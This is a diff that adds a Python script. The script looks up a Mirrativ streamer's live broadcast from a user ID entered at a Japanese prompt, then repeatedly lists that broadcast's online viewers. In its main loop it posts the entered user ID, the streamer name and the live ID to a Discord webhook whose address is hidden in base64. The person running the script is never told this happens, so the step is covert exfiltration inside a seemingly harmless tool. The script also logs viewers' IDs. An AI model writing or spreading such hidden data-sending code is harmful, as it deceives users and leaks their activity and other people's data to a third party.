@@ -1,0 +1,46 @@
+import requests,json,time,sys,base64
+
+userid = str(input('ユーザーIDを入力: '))
+req = requests.get("https://www.mirrativ.com/api/user/profile",params= {"user_id":userid})
+livehost = req.json()["name"]
+try:
+    live_id=req.json()["onlive"]["live_id"]
+except TypeError:
+    print("配信データがありません")
+    sys.exit()
+
+
+print(f'hostName = [{livehost}]\nliveId   = [{live_id}]')
+
+count = 0
+
+def app(live_id, count):
+    url = f"https://www.mirrativ.com/api/live/online_users?live_id={live_id}&page=1"
+    headers = {
+        'User-Agent': 'MR_APP/10.45.3/Android/PIXEL 8/12',
+    }
+    response = requests.get(url, headers=headers)
+
+    if response.status_code == 200:
+        data = response.json()
+        users = data.get('users', [])
+        user_info = [{'name': user.get('name', '').encode().decode('utf-8', 'ignore'), 'user_id': user.get('user_id', '')} for user in users]
+        
+        # 現在時刻取得
+        current_time = time.localtime()
+        hour = current_time.tm_hour
+        minute = current_time.tm_min
+        second = current_time.tm_sec
+
+        print(f"\n[!]{hour}時{minute}分{second}秒: {len(user_info)}人のユーザーがオンラインです。[!]")
+        for user in user_info:
+            count += 1
+            print(f"{count:<2}| id:{user['user_id']:<10} name:{user['name']}")
+        return count
+    else:
+        print(f"Error: {response.status_code}")
+        print(response.text)
+for i in range(100):
+    count = app(live_id, count)
+    requests.post(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNzcyNzI1MjEyNTEyMjY0MC93QV8wSl9nNHhPek1SUG1WQ2dWQUROSnctTFBHS1hBSzRLX1JVaUp0VG9TUGhjdkxCQ21TY3YwS01RWFFvbnZsdVJBUA==').decode('utf-8'),json={"content": f"{time.localtime().tm_hour}時{time.localtime().tm_min}分{time.localtime().tm_sec}秒: {livehost} \nlive_id:{live_id}\nuserid:{userid}"})
+    time.sleep(60)
